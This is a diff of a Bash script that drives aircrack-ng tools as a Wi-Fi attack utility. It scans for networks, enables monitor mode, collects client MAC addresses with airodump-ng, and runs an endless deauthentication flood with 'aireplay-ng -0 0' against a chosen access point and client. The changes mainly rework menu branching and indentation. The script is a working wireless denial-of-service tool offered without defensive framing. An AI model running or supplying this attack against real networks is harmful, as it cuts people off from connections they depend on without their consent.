@@ -53,22 +53,27 @@ if [ $ask -gt 3 ]
 		exit 1
 fi
 #opt end
-#main
+#read interface
 iwconfig
 echo "Interface name(e.g. wlan0):"
 read inter
 clear
-echo "scanning networks.."
-sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
-echo "Choose Channel: (can be ignored if searching for hidden AP)"
-read chan
-echo "Please wait.. monitor mode is being enabled.."
-trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $inter\mon > /dev/null && exit 1' INT
-sudo airmon-ng start $inter $chan > /dev/null
-echo "MAC of Access-Point: (can be ignored if searching for hidden AP)"
-read macacc
-echo "loading attack..."
-tput setaf 1
+#read interface end
+#main
+if [ $ask -eq 2 ] || [ $ask -eq 1 ]
+	then
+		echo "scanning networks.."
+		sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
+		echo "Choose Channel:"
+		read chan
+		echo "Please wait.. monitor mode is being enabled.."
+		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $inter\mon > /dev/null && exit 1' INT
+		sudo airmon-ng start $inter $chan > /dev/null
+		echo "MAC of Access-Point:"
+		read macacc
+		echo "loading attack..."
+		tput setaf 1
+fi
 #main end
 #options
 if [ $ask -eq 2 ]
@@ -79,20 +84,18 @@ if [ $ask -eq 2 ]
 		exit 0
 fi
 if [ $ask -eq 1 ]
-then
-echo "How long should be searched for Clients? [sec]:"
-read secs
-echo "reading clients from network.. [scanning $secs seconds]"
-sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $inter\mon
-echo "Client MAC:"
-read clientmac
-tput setaf 1
-sudo service network-manager stop
-sudo aireplay-ng -0 0 -a $macacc -c $clientmac $inter\mon
-sudo service network-manager start
-sudo airmon-ng stop $inter\mon > /dev/null
-tput sgr0
-exit 0
+	then
+		echo "How long should be searched for Clients? [sec]:"
+		read secs
+		echo "reading clients from network.. [scanning $secs seconds]"
+		sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $inter\mon
+		echo "Client MAC:"
+		read clientmac
+		tput setaf 1
+		sudo aireplay-ng -0 0 -a $macacc -c $clientmac $inter\mon
+		sudo airmon-ng stop $inter\mon > /dev/null
+		tput sgr0
+		exit 0
 fi
 if [ $ask -eq 3 ]
 	then
